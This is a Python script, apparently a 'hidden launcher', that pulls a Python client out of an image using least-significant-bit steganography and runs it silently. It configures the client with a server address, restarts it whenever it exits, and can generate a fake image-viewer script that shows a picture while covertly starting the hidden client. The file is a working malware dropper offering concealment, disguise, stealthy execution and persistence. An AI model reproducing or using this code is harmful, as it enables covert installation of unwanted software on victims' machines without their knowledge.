#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Hidden Launcher
Extracts and executes client from steganographic image files.
"""

import os
import sys
import tempfile
import subprocess
import threading
import time
import struct
import zlib
from PIL import Image
import io

class TSMHiddenLauncher:
    def __init__(self):
        self.magic_header = b"TSM_SENIOR_OASIS_PANEL"
        self.temp_dir = None
        self.client_process = None
        self.running = False

    def _decode_data_from_image(self, image_data):
        """Decode payload data from image using LSB steganography"""
        try:
            # Open image
            img = Image.open(io.BytesIO(image_data))
            
            # Convert to RGB if necessary
            if img.mode != 'RGB':
                img = img.convert('RGB')
            
            width, height = img.size
            pixels = list(img.getdata())
            
            # Extract LSBs from pixels
            bits = []
            for pixel in pixels:
                r, g, b = pixel
                bits.append(str(r & 1))
                bits.append(str(g & 1))
                bits.append(str(b & 1))
            
            # Convert bits to bytes
            data_bytes = []
            for i in range(0, len(bits), 8):
                if i + 8 <= len(bits):
                    byte_bits = ''.join(bits[i:i+8])
                    data_bytes.append(int(byte_bits, 2))
            
            data = bytes(data_bytes)
            
            # Check for magic header
            if not data.startswith(self.magic_header):
                raise ValueError("No TSM data found in image")
            
            # Extract payload length
            header_start = len(self.magic_header)
            payload_length = struct.unpack('>I', data[header_start:header_start+4])[0]
            
            # Extract and decompress payload
            payload_start = header_start + 4
            compressed_payload = data[payload_start:payload_start + payload_length]
            payload = zlib.decompress(compressed_payload)
            
            return payload
            
        except Exception as e:
            raise Exception(f"Error decoding data from image: {e}")

    def _create_temp_directory(self):
        """Create temporary directory for extracted files"""
        try:
            self.temp_dir = tempfile.mkdtemp(prefix="tsm_")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Error creating temp directory: {e}")
            return False

    def _cleanup_temp_directory(self):
        """Clean up temporary directory"""
        try:
            if self.temp_dir and os.path.exists(self.temp_dir):
                import shutil
                shutil.rmtree(self.temp_dir)
        except Exception as e:
            pass  # Silent cleanup

    def _extract_client_from_image(self, image_path):
        """Extract client executable from steganographic image"""
        try:
            # Read steganographic image
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            # Decode client data
            client_data = self._decode_data_from_image(image_data)
            
            # Create temp directory if needed
            if not self.temp_dir:
                if not self._create_temp_directory():
                    return None
            
            # Save extracted client
            client_path = os.path.join(self.temp_dir, "tsm_client.py")
            with open(client_path, 'wb') as f:
                f.write(client_data)
            
            return client_path
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Error extracting client: {e}")
            return None

    def _run_client_hidden(self, client_path):
        """Run the extracted client in hidden mode"""
        try:
            # Run client with hidden flag
            cmd = [sys.executable, client_path, "--hidden"]
            
            # Start client process
            self.client_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            self.running = True
            print("TSM-SeniorOasisPanel: Client launched in hidden mode")
            return True
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Error running client: {e}")
            return False

    def _monitor_client(self):
        """Monitor client process and restart if needed"""
        while self.running:
            try:
                if self.client_process and self.client_process.poll() is not None:
                    # Client process ended, restart it
                    print("TSM-SeniorOasisPanel: Client disconnected, restarting...")
                    time.sleep(5)  # Wait 5 seconds before restart
                    
                    if self.temp_dir:
                        client_path = os.path.join(self.temp_dir, "tsm_client.py")
                        if os.path.exists(client_path):
                            self._run_client_hidden(client_path)
                
                time.sleep(10)  # Check every 10 seconds
                
            except Exception as e:
                print(f"TSM-SeniorOasisPanel: Monitor error: {e}")
                time.sleep(10)

    def launch_from_image(self, image_path, server_host='localhost', server_port=5000):
        """Launch hidden client from steganographic image"""
        try:
            print("TSM-SeniorOasisPanel: Initializing hidden launcher...")
            
            # Extract client from image
            client_path = self._extract_client_from_image(image_path)
            if not client_path:
                return False
            
            # Update client with server configuration
            self._update_client_config(client_path, server_host, server_port)
            
            # Run client in hidden mode
            if not self._run_client_hidden(client_path):
                return False
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self._monitor_client, daemon=True)
            monitor_thread.start()
            
            print("TSM-SeniorOasisPanel: Hidden client active")
            return True
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Launch error: {e}")
            return False

    def _update_client_config(self, client_path, server_host, server_port):
        """Update client configuration with server details"""
        try:
            # Read client file
            with open(client_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update server configuration
            content = content.replace(
                "self.host = 'localhost'",
                f"self.host = '{server_host}'"
            )
            content = content.replace(
                "self.port = 5000",
                f"self.port = {server_port}"
            )
            
            # Write updated client
            with open(client_path, 'w', encoding='utf-8') as f:
                f.write(content)
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Config update error: {e}")

    def stop(self):
        """Stop the hidden client"""
        try:
            self.running = False
            
            if self.client_process:
                self.client_process.terminate()
                self.client_process.wait(timeout=5)
            
            self._cleanup_temp_directory()
            print("TSM-SeniorOasisPanel: Hidden client stopped")
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stop error: {e}")

    def create_image_viewer_launcher(self, stego_image_path, output_path):
        """Create a launcher that appears to be an image viewer"""
        launcher_code = f'''#!/usr/bin/env python3
"""
Image Viewer - TSM-SeniorOasisPanel Hidden Launcher
"""

import os
import sys
import subprocess
import tempfile
import shutil
from PIL import Image

def view_image(image_path):
    """Display the image using default system viewer"""
    try:
        # Open image to verify it's valid
        img = Image.open(image_path)
        img.show()
        
        # Launch hidden TSM client in background
        launcher_path = os.path.join(os.path.dirname(__file__), "TSM_HiddenLauncher.py")
        if os.path.exists(launcher_path):
            subprocess.Popen([
                sys.executable, launcher_path, 
                "--launch", image_path,
                "--server", "localhost:5000"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception as e:
        print(f"Error viewing image: {{e}}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        view_image(sys.argv[1])
    else:
        print("Usage: python image_viewer.py <image_path>")
'''

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(launcher_code)

def main():
    """Main function for hidden launcher"""
    if len(sys.argv) < 3:
        print("Usage:")
        print("  Launch: python TSM_HiddenLauncher.py --launch <stego_image> [--server host:port]")
        print("  Create Viewer: python TSM_HiddenLauncher.py --create-viewer <stego_image> <output>")
        sys.exit(1)
    
    launcher = TSMHiddenLauncher()
    
    if sys.argv[1] == "--launch":
        image_path = sys.argv[2]
        server_host = "localhost"
        server_port = 5000
        
        # Parse server configuration if provided
        if len(sys.argv) > 3 and sys.argv[3] == "--server":
            if len(sys.argv) > 4:
                server_config = sys.argv[4].split(":")
                if len(server_config) == 2:
                    server_host = server_config[0]
                    server_port = int(server_config[1])
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        try:
            launcher.launch_from_image(image_path, server_host, server_port)
            
            # Keep running until interrupted
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                launcher.stop()
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Error: {e}")
            launcher.stop()
    
    elif sys.argv[1] == "--create-viewer":
        if len(sys.argv) != 4:
            print("Usage: python TSM_HiddenLauncher.py --create-viewer <stego_image> <output>")
            sys.exit(1)
        
        stego_image_path = sys.argv[2]
        output_path = sys.argv[3]
        
        if not os.path.exists(stego_image_path):
            print(f"Error: Image file '{stego_image_path}' not found")
            sys.exit(1)
        
        launcher.create_image_viewer_launcher(stego_image_path, output_path)
        print(f"TSM-SeniorOasisPanel: Image viewer launcher created: {output_path}")
    
    else:
        print("Invalid operation. Use '--launch' or '--create-viewer'")
        sys.exit(1)

if __name__ == "__main__":
    main()
